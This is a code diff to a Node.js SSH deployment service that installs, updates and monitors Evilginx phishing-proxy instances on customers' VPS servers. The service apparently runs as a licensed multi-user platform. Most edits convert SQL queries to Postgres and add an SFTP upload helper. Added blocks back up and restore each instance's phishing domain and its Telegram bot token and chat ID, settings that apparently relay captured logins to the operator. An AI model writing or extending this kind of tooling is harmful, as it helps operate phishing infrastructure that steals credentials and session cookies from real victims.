@@ -3,6 +3,7 @@
 // =====================================================
 
 const { Client } = require('ssh2');
+const fs = require('fs');
 const crypto = require('crypto');
 
 class SSHService {
@@ -143,7 +144,7 @@ class SSHService {
 
         // Get VPS details from database
         const result = await this.pool.query(
-            'SELECT * FROM vps_instances WHERE id = ?',
+            'SELECT * FROM vps_instances WHERE id = $1',
             [vpsId]
         );
 
@@ -194,12 +195,7 @@ class SSHService {
 
                 stream.on('close', (code, signal) => {
                     if (timer) clearTimeout(timer);
-                    resolve({
-                        code,
-                        signal,
-                        stdout: stdout.trim(),
-                        stderr: stderr.trim()
-                    });
+                    resolve({ stdout: stdout.trim(), stderr: stderr.trim(), code });
                 });
 
                 stream.on('data', (data) => {
@@ -209,6 +205,60 @@ class SSHService {
                 stream.stderr.on('data', (data) => {
                     stderr += data.toString();
                 });
+            });
+        });
+    }
+
+    // Upload file via SFTP
+    async uploadFile(conn, localPath, remotePath, log) {
+        return new Promise((resolve, reject) => {
+            const fs = require('fs');
+            
+            conn.sftp((err, sftp) => {
+                if (err) {
+                    reject(new Error('SFTP initialization failed: ' + err.message));
+                    return;
+                }
+
+                const readStream = fs.createReadStream(localPath);
+                const writeStream = sftp.createWriteStream(remotePath);
+
+                let uploaded = 0;
+                const fileSize = fs.statSync(localPath).size;
+                const startTime = Date.now();
+
+                readStream.on('data', (chunk) => {
+                    uploaded += chunk.length;
+                    const percent = ((uploaded / fileSize) * 100).toFixed(1);
+                    const elapsed = (Date.now() - startTime) / 1000;
+                    const speed = (uploaded / elapsed / 1024 / 1024).toFixed(2);
+                    
+                    if (log && uploaded % (5 * 1024 * 1024) === 0) {
+                        log('info', `📤 Uploaded: ${percent}% (${speed} MB/s)`).catch(() => {});
+                    }
+                });
+
+                writeStream.on('close', () => {
+                    const elapsed = (Date.now() - startTime) / 1000;
+                    const speed = (fileSize / elapsed / 1024 / 1024).toFixed(2);
+                    if (log) {
+                        log('info', `✅ Upload complete: ${(fileSize / 1024 / 1024).toFixed(2)} MB in ${elapsed.toFixed(1)}s (${speed} MB/s)`).catch(() => {});
+                    }
+                    sftp.end();
+                    resolve();
+                });
+
+                writeStream.on('error', (err) => {
+                    sftp.end();
+                    reject(new Error('Upload failed: ' + err.message));
+                });
+
+                readStream.on('error', (err) => {
+                    sftp.end();
+                    reject(new Error('Read failed: ' + err.message));
+                });
+
+                readStream.pipe(writeStream);
             });
         });
     }
@@ -276,26 +326,26 @@ class SSHService {
             if (logCallback) await logCallback(level, message);
             const logId = crypto.randomBytes(16).toString('hex');
             await this.pool.query(
-                'INSERT INTO deployment_logs (id, deployment_id, level, message) VALUES (?, ?, ?, ?)',
-                [logId, deploymentId, level, message]
+                'INSERT INTO deployment_logs (deployment_id, level, message) VALUES ($1, $2, $3)',
+                [deploymentId, level, message]
             );
         };
 
         try {
             // Get VPS details
             const vpsResult = await this.pool.query(
-                'SELECT * FROM vps_instances WHERE id = ?',
+                'SELECT * FROM vps_instances WHERE id = $1',
                 [vpsId]
             );
             const vps = vpsResult.rows[0];
 
             // Update deployment status
             await this.pool.query(
-                "UPDATE deployments SET status = ?, started_at = datetime('now') WHERE id = ?",
+                "UPDATE deployments SET status = $1, started_at = CURRENT_TIMESTAMP WHERE id = $2",
                 ['in_progress', deploymentId]
             );
             await this.pool.query(
-                'UPDATE vps_instances SET status = ? WHERE id = ?',
+                'UPDATE vps_instances SET status = $1 WHERE id = $2',
                 ['deploying', vpsId]
             );
 
@@ -387,12 +437,25 @@ class SSHService {
                 sudo chmod -R 755 ${installPath}
             `);
 
+                            
+                            // =====================================================
+                            // Backup existing configuration before deployment
+                            // =====================================================
+                            await log('info', '💾 Backing up existing Evilginx configuration...');
+                            await this.executeCommand(conn, `
+                                if [ -f ${installPath}/data/config.json ]; then
+                                    sudo cp ${installPath}/data/config.json ${installPath}/config.backup.json
+                                    echo "Configuration backed up"
+                                else
+                                    echo "No existing configuration found"
+                                fi
+                            `);
             // =====================================================
             // STEP 4: Get user info and create license config + Admin API key
             // =====================================================
             await log('info', '🔑 Creating license configuration...');
             const userResult = await this.pool.query(
-                'SELECT id, api_key, email, username FROM users WHERE id = ?',
+                'SELECT id, api_key, email, username FROM users WHERE id = $1',
                 [vps.user_id]
             );
             const user = userResult.rows[0];
@@ -400,7 +463,7 @@ class SSHService {
             // Generate a unique admin API key for this VPS and store in database
             const adminApiKey = crypto.randomBytes(32).toString('hex');
             await this.pool.query(
-                'UPDATE vps_instances SET admin_api_key = ? WHERE id = ?',
+                'UPDATE vps_instances SET admin_api_key = $1 WHERE id = $2',
                 [adminApiKey, vpsId]
             );
             await log('info', '🔐 Admin API key generated and stored securely');
@@ -723,6 +786,76 @@ EOFSVC`);
                             
                             // Cleanup cookies
                             await this.executeCommand(conn, 'rm -f /tmp/evilginx_cookies.txt');
+                            // =====================================================
+                            // Restore previous configuration if available
+                            // =====================================================
+                            await log('info', '📥 Restoring previous Evilginx configuration...');
+                            const restoreResult = await this.executeCommand(conn, `
+                                if [ -f ${installPath}/config.backup.json ]; then
+                                    # Read backup config
+                                    BACKUP_CONFIG=$(cat ${installPath}/config.backup.json)
+                                    
+                                    # Extract important settings using grep/awk
+                                    BASE_DOMAIN=$(echo "$BACKUP_CONFIG" | grep -oP '"base_domain"\s*:\s*"\K[^"]+' || echo "")
+                                    TELEGRAM_TOKEN=$(echo "$BACKUP_CONFIG" | grep -oP '"telegram_bot_token"\s*:\s*"\K[^"]+' || echo "")
+                                    TELEGRAM_CHAT=$(echo "$BACKUP_CONFIG" | grep -oP '"telegram_chat_id"\s*:\s*"\K[^"]+' || echo "")
+                                    
+                                    echo "DOMAIN:$BASE_DOMAIN"
+                                    echo "TELEGRAM_TOKEN:$TELEGRAM_TOKEN"
+                                    echo "TELEGRAM_CHAT:$TELEGRAM_CHAT"
+                                else
+                                    echo "NO_BACKUP"
+                                fi
+                            `);
+                            
+                            if (!restoreResult.stdout.includes('NO_BACKUP')) {
+                                const lines = restoreResult.stdout.split('\n');
+                                let baseDomain = '';
+                                let telegramToken = '';
+                                let telegramChat = '';
+                                
+                                lines.forEach(line => {
+                                    if (line.startsWith('DOMAIN:')) baseDomain = line.substring(7).trim();
+                                    if (line.startsWith('TELEGRAM_TOKEN:')) telegramToken = line.substring(15).trim();
+                                    if (line.startsWith('TELEGRAM_CHAT:')) telegramChat = line.substring(14).trim();
+                                });
+                                
+                                // Restore base domain
+                                if (baseDomain && baseDomain !== '') {
+                                    await this.executeCommand(conn, `
+                                        curl -s -X POST http://localhost:5555/api/config \
+                                            -H "Content-Type: application/json" \
+                                            -b /tmp/evilginx_cookies.txt \
+                                            -d '{"field":"base_domain","value":"${baseDomain}"}'
+                                    `);
+                                    await log('info', `✅ Base domain restored: ${baseDomain}`);
+                                }
+                                
+                                // Restore Telegram settings
+                                if (telegramToken && telegramToken !== '') {
+                                    await this.executeCommand(conn, `
+                                        curl -s -X POST http://localhost:5555/api/config \
+                                            -H "Content-Type: application/json" \
+                                            -b /tmp/evilginx_cookies.txt \
+                                            -d '{"field":"telegram_bot_token","value":"${telegramToken}"}'
+                                    `);
+                                    await log('info', '✅ Telegram bot token restored');
+                                }
+                                
+                                if (telegramChat && telegramChat !== '') {
+                                    await this.executeCommand(conn, `
+                                        curl -s -X POST http://localhost:5555/api/config \
+                                            -H "Content-Type: application/json" \
+                                            -b /tmp/evilginx_cookies.txt \
+                                            -d '{"field":"telegram_chat_id","value":"${telegramChat}"}'
+                                    `);
+                                    await log('info', '✅ Telegram chat ID restored');
+                                }
+                                
+                                await log('info', '✅ Previous configuration restored successfully');
+                            } else {
+                                await log('info', 'ℹ️  No previous configuration to restore');
+                            }
                         }
                     } else {
                         await log('warning', '⚠️ Could not detect external IP - SSL may need manual configuration');
@@ -741,19 +874,19 @@ EOFSVC`);
             // =====================================================
             await this.pool.query(`
                 UPDATE vps_instances SET 
-                    status = ?, 
-                    is_deployed = 1, 
-                    deployed_version = ?,
-                    updated_at = datetime('now')
-                WHERE id = ?
+                    status = $1, 
+                    is_deployed = TRUE, 
+                    deployed_version = $2,
+                    updated_at = CURRENT_TIMESTAMP
+                WHERE id = $3
             `, [isRunning ? 'running' : 'error', version, vpsId]);
 
             await this.pool.query(`
                 UPDATE deployments SET 
-                    status = ?, 
-                    completed_at = datetime('now'),
-                    to_version = ?
-                WHERE id = ?
+                    status = $1, 
+                    completed_at = CURRENT_TIMESTAMP,
+                    to_version = $2
+                WHERE id = $3
             `, ['completed', version, deploymentId]);
 
             // =====================================================
@@ -771,7 +904,7 @@ EOFSVC`);
                 if (actualKey && actualKey.length >= 32) {
                     // Update database with the actual key
                     await this.pool.query(
-                        'UPDATE vps_instances SET admin_api_key = ? WHERE id = ?',
+                        'UPDATE vps_instances SET admin_api_key = $1 WHERE id = $2',
                         [actualKey, vpsId]
                     );
                     await log('info', '✅ API key synced to database');
@@ -787,11 +920,11 @@ EOFSVC`);
             await log('error', `❌ Deployment failed: ${error.message}`);
             
             await this.pool.query(
-                "UPDATE deployments SET status = ?, completed_at = datetime('now'), error_message = ? WHERE id = ?",
+                "UPDATE deployments SET status = $1, completed_at = CURRENT_TIMESTAMP, error_message = $2 WHERE id = $3",
                 ['failed', error.message, deploymentId]
             );
             await this.pool.query(
-                'UPDATE vps_instances SET status = ?, last_error = ? WHERE id = ?',
+                'UPDATE vps_instances SET status = $1, last_error = $2 WHERE id = $3',
                 ['error', error.message, vpsId]
             );
 
@@ -810,7 +943,7 @@ EOFSVC`);
         const isRunning = status.stdout.trim() === 'active';
         
         await this.pool.query(
-            'UPDATE vps_instances SET status = ? WHERE id = ?',
+            'UPDATE vps_instances SET status = $1 WHERE id = $2',
             [isRunning ? 'running' : 'error', vpsId]
         );
         
@@ -822,7 +955,7 @@ EOFSVC`);
         await this.executeCommand(conn, 'sudo systemctl stop evilginx 2>/dev/null || true');
         
         await this.pool.query(
-            'UPDATE vps_instances SET status = ? WHERE id = ?',
+            'UPDATE vps_instances SET status = $1 WHERE id = $2',
             ['stopped', vpsId]
         );
         
@@ -838,7 +971,7 @@ EOFSVC`);
         const isRunning = status.stdout.trim() === 'active';
         
         await this.pool.query(
-            'UPDATE vps_instances SET status = ? WHERE id = ?',
+            'UPDATE vps_instances SET status = $1 WHERE id = $2',
             [isRunning ? 'running' : 'error', vpsId]
         );
         
@@ -905,7 +1038,7 @@ EOFSVC`);
             
             // Update status, heartbeat, and uptime
             await this.pool.query(
-                "UPDATE vps_instances SET status = ?, last_heartbeat = datetime('now'), uptime_seconds = ?, updated_at = datetime('now'), last_error = NULL WHERE id = ?",
+                "UPDATE vps_instances SET status = $1, last_heartbeat = CURRENT_TIMESTAMP, uptime_seconds = $2, updated_at = CURRENT_TIMESTAMP, last_error = NULL WHERE id = $3",
                 [newStatus, uptimeSeconds, vpsId]
             );
 
@@ -913,7 +1046,7 @@ EOFSVC`);
             if (tmuxRunning || isActive) {
                 try {
                     // Get VPS install path
-                    const vpsResult = await this.pool.query('SELECT install_path FROM vps_instances WHERE id = ?', [vpsId]);
+                    const vpsResult = await this.pool.query('SELECT install_path FROM vps_instances WHERE id = $1', [vpsId]);
                     const installPath = vpsResult.rows[0]?.install_path || '/opt/evilginx';
                     
                     // Read actual API key from VPS
@@ -923,7 +1056,7 @@ EOFSVC`);
                     if (actualKey && actualKey.length >= 32) {
                         // Update database with actual key (silently)
                         await this.pool.query(
-                            'UPDATE vps_instances SET admin_api_key = ? WHERE id = ?',
+                            'UPDATE vps_instances SET admin_api_key = $1 WHERE id = $2',
                             [actualKey, vpsId]
                         );
                     }
@@ -943,7 +1076,7 @@ EOFSVC`);
         } catch (error) {
             // VPS is offline - couldn't connect
             await this.pool.query(
-                "UPDATE vps_instances SET status = 'offline', last_error = ?, updated_at = datetime('now') WHERE id = ?",
+                "UPDATE vps_instances SET status = 'offline', last_error = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2",
                 [error.message, vpsId]
             );
             return { running: false, status: 'offline', connected: false, error: error.message };
@@ -994,19 +1127,19 @@ EOFSVC`);
     async updateAllVPS() {
         // Get all deployed VPS instances
         const result = await this.pool.query(
-            'SELECT id, user_id FROM vps_instances WHERE is_deployed = 1'
+            'SELECT id, user_id FROM vps_instances WHERE is_deployed = TRUE'
         );
 
         const updates = [];
         for (const vps of result.rows) {
             try {
-                const deployId = crypto.randomBytes(16).toString('hex');
-                
                 // Create deployment record
-                await this.pool.query(`
-                    INSERT INTO deployments (id, vps_id, user_id, type, triggered_by)
-                    VALUES (?, ?, ?, 'update', 'webhook')
-                `, [deployId, vps.id, vps.user_id]);
+                const insertResult = await this.pool.query(`
+                    INSERT INTO deployments (vps_id, user_id, type, triggered_by)
+                    VALUES ($1, $2, 'update', 'webhook')
+                    RETURNING id
+                `, [vps.id, vps.user_id]);
+                const deployId = insertResult.rows[0].id;
                 
                 // Start deployment (non-blocking)
                 this.deploy(vps.id, deployId).catch(err => {
@@ -1043,3 +1176,9 @@ EOFSVC`);
 }
 
 module.exports = SSHService;
+
+
+
+
+
+
